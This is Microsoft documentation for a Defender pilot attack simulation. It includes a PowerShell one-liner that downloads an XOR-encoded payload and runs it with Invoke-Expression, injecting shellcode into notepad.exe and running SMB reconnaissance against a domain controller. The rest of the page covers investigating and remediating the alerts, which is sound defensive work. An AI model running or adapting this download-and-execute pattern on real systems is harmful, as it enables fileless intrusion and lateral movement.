---
title: Run an attack simulation in a Microsoft 365 Defender pilot environment 
description: Run attack simulations for Microsoft 365 Defender to see how it unfolds and is quickly remediated.
keywords: Microsoft 365 Defender pilot attack simulation, run Microsoft 365 Defender pilot attack simulation, simulate attack in Microsoft 365 Defender, Microsoft 365 Defender pilot project, cyber security, advanced persistent threat, enterprise security, devices, device, identity, users, data, applications, incidents, automated investigation and remediation, advanced hunting
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords: 
  - NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection: 
  - M365-security-compliance
  - m365solution-scenario
  - m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
---

# Run an attack simulation in a Microsoft 365 Defender pilot environment

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

<!--
Based on: m365d-pilot-simulate.md
--> 

After preparing your [pilot environment](eval-defender-investigate-respond.md), it's time to test Microsoft 365 Defender's incident response and automated investigation and remediation capabilities. 

You'll simulate a sophisticated attack that leverages advanced techniques to hide from detection. The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users' devices. This category of attacks usually doesn't include files dropped on the victim's device ad they occur solely in memory. They "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution. Such behavior allows them to evade detection and persist on the device.

In this simulation, our sample scenario starts with a PowerShell script. In the real world, a user might be tricked into running a script or the script might run from a remote connection to another computer from a previously infected device, which indicates that the attacker is attempting to move laterally in the network. Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.

![Fileless PowerShell attack with process injection and SMB reconnaisance attack diagram](../../media/mtp/mtpdiydiagram.png)

During the simulation, the attack injects shellcode into a seemingly innocent process. The scenario requires the use of notepad.exe. We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe. The shellcode then goes on to contact the attacker's command-and-control (C2) server to receive instructions on how to proceed. The script attempts executing reconnaissance queries against the domain controller (DC). Reconnaissance allows an attacker to get information about recent user login information. Once attackers have this information, they can move laterally in the network to get to a specific sensitive account

> [!IMPORTANT]
> For optimum results, follow the attack simulation instructions as closely as possible.

## Run the attack scenario simulation

To run the attack scenario simulation:

1. Ensure that your pilot environment includes the [Active Directory Domain Services (AD DS) domain controller and Windows 10 device](eval-defender-investigate-endpoints.md).

2. Sign in to the test device with the test user account.

3. Open a Windows PowerShell window on the test device.

4. Copy the following simulation script:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > If you open this article on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks. If this is the case, download this document and open it on Adobe Reader.

5. Paste and run the copied script in the PowerShell window.

> [!NOTE]
> If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work. Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.

A few seconds later, the Notepad app will open. A simulated attack code will be injected into Notepad. Keep the automatically generated Notepad instance open to experience the full scenario.

The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.

You'll see a message displayed on the PowerShell console when this script completes.

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

To see the Automated Incident and Response feature in action, keep the notepad.exe process open. You'll see Automated Incident and Response stop the Notepad process.

## Investigate the incident for the simulated attack

> [!NOTE]
> Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.

1. Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.

2. Navigate to **Incidents** from the menu.

    ![Screenshot of incidents as shown on the Microsoft 365 Security Center's left-hand side menu](../../media/mtp/fig1.png)

3. The new incident for the simulated attack will appear in the incident queue.

    ![Screenshot of the incident queue](../../media/mtp/fig2.png)

### Investigate the attack as a single incident

Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity. By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.

The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.

To view the incident:

1. Navigate to the **Incidents** queue.

   ![Screenshot of incidents from the navigation menu](../../media/mtp/fig1.png)

2. Select the newest item by clicking on the circle located left of the incident name. A side panel displays additional information about the incident, including all the related alerts. Each incident has a unique name that describes it based on the attributes of the alerts it includes.

   ![Screenshot of the incidents page where generated alerts are aggregated during the simulation](../../media/mtp/fig4.png)

   The alerts that show in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.

3. Select **Open incident page** to get more information about the incident.

   In the **Incident** page, you can see all the alerts and information related to the incident. The information includes the entities and assets that are involved in the alert, the detection source of the alerts (Microsoft Defender for Identity, EDR), and the reason they were linked together. Reviewing the incident alert list shows the progression of the attack. From this view, you can see and investigate the individual alerts.

   You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.

   ![Screenshot of where to click Manage incident](../../media/mtp/fig5a.png)

   ![Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments ](../../media/mtp/fig5b.png)

### Review generated alerts

Let's look at some of the alerts generated during the simulated attack.

> [!NOTE]
> We'll walk through only a few of the alerts generated during the simulated attack. Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.

![Screenshot of generated alerts](../../media/mtp/fig6.png)

#### Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint EDR)

Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools. One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.

To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques. The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.

![Screenshot of the alert for injection of potentially malicious code](../../media/mtp/fig7.png)

#### Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint EDR)

Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique. This method ensures durability and raises the bar for attackers to switch to newer tactics.

We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors. These anomalous behaviors often indicate that extraneous code was introduced and are running in an otherwise trusted process.

For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location. This outcome is independent of the specific method used to introduce and execute the malicious code.

> [!NOTE]
> Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.

Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.

Select the IP address in the alert process tree to view the IP address details page.

![Screenshot of the alert for unexpected behavior by a process run with no command line arguments](../../media/mtp/fig8.png)

The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).
![Screenshot of the IP address details page](../../media/mtp/fig9.png)

#### Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)

Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.

In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.

![Screenshot of the Microsoft Defender for Identity alert for User and IP address reconnaissance](../../media/mtp/fig10.png)

### Review the device timeline [Microsoft Defender for Endpoint]

After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier. Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.

Select the name of the device where the attack was conducted, to open the entity page for that specific device. In that page, you can see alerts that were triggered and related events.

Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.

![Screenshot of the device timeline with behaviors](../../media/mtp/fig11.png)

Expanding some of the more interesting behaviors provides useful details, such as process trees.

For example, scroll down until you find the alert event **Suspicious process injection observed**. Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane. Use the search bar for filtering if necessary.

![Screenshot of the process tree for selected PowerShell file creation behavior](../../media/mtp/fig12.png)

### Review the user information [Microsoft Cloud App Security]

On the incident page, select the **Users** tab to display the list of users involved in the attack. The table contains additional information about each user, including each user's **Investigation Priority** score.

Select the user name to open the user's profile page where further investigation can be conducted. [Read more about investigating risky users](/cloud-app-security/tutorial-ueba#identify).

![Screenshot of Cloud App Security user page](../../media/mtp/fig13.png)

## Automated investigation and remediation

> [!NOTE]
>Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Navigate back to the incident in the Microsoft 365 Security Center portal. The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint. The screenshot below displays only the automated investigation triggered by Defender for Endpoint. By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.

![Screenshot of automated investigations related to the incident](../../media/mtp/fig14.png)

Select the alert that triggered an investigation to open the **Investigation details** page. You'll see the following details:

- Alert(s) that triggered the automated investigation.
- Impacted users and devices. If indicators are found on additional devices, these additional devices will be listed as well.
- List of evidence. The entities found and analyzed, such as files, processes, services, drivers, and network addresses. These entities are analyzed for possible relationships to the alert and rated as benign or malicious.
- Threats found. Known threats that are found during the investigation.

> [!NOTE]
> Depending on timing, the automated investigation might still be running. Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results. Refresh the **Investigation details** page to get the latest findings.

![Screenshot of Investigation details page](../../media/mtp/fig15.png)

During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation. Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.

You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.

## Resolve the incident

After the investigation is complete and confirmed to be remediated, close the incident.

Select **Manage incident**. Set the status to **Resolve incident** and select the relevant classification.

When the incident is resolved, it closes all of the associated alerts in Microsoft 365 Security Center and in the related portals.

![Screenshot of the incidents page with the open Manage incident panel where you can click the switch to resolve incident](../../media/mtp/fig16.png)

This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.

## Next step

[Try additional Microsoft 365 Defender incident response capabilities](eval-defender-investigate-respond-additional.md)

### Navigation you may need

[Create the Microsoft 365 Defender Evaluation Environment](eval-create-eval-environment.md)
